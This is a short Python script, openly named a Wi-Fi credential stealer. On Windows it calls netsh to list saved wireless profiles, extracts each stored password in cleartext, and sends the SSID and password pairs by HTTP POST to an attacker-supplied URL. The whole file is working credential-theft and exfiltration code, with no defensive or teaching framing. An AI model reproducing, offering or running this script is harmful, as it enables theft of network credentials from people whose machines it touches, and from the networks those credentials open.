import subprocess, argparse, requests, re, sys

class wifi_cred_stealer():
    def __init__(self, url,v):
        print('Extracting wifi passwords...')
        #URL to post results to
        self.url = url
        self.verbose = v
    def steal(self):
        payload = {}
        
        #Use Python to execute Windows command
        wifi_profile_output = subprocess.run(["netsh", "wlan", "show", "profile"], capture_output = True).stdout.decode()       
        # regex that returns a list of the wifi profile names
        profiles = re.findall('(?<=: )[^\n\r]+', wifi_profile_output)
        if profiles == []:
            print("No Wi-Fi profiles found.  Exiting application")
            sys.exit()

        # for each profile, extract the password
        for profile in profiles:
            wifi_passwd_output = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output = True).stdout.decode()
            password = re.findall('(?:Key Content\s+: )([^\n\r]+)', wifi_passwd_output)
            #dont add to payload if a password wasn't found
            if password:
                payload.update({profile:password[0]})
            else:
                pass

        #print the harvested wifi creds
        if self.verbose:
            for k,v in payload.items():
                print(f"SSID: {k}\tPassword: {v}")
        #Send the harvested wifi creds
        try:
            requests.post(self.url, params='format=json', data=payload)
        except Exception as e:
            print(f"Failed to post wifi creds:\n{e}")
        
def parse_args():
    parser = argparse.ArgumentParser(description='Posts Wifi SSIDs and passwords to an endpoint')
    parser.add_argument('-u','--url',help='The URL to post wifi creds to.',required=True)
    parser.add_argument('-v','--verbose',help='Displays the Wifi SSIDs and passwords',default=False, action='store_true')
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = parse_args()
    stealer = wifi_cred_stealer(args.url, args.verbose)
    stealer.steal()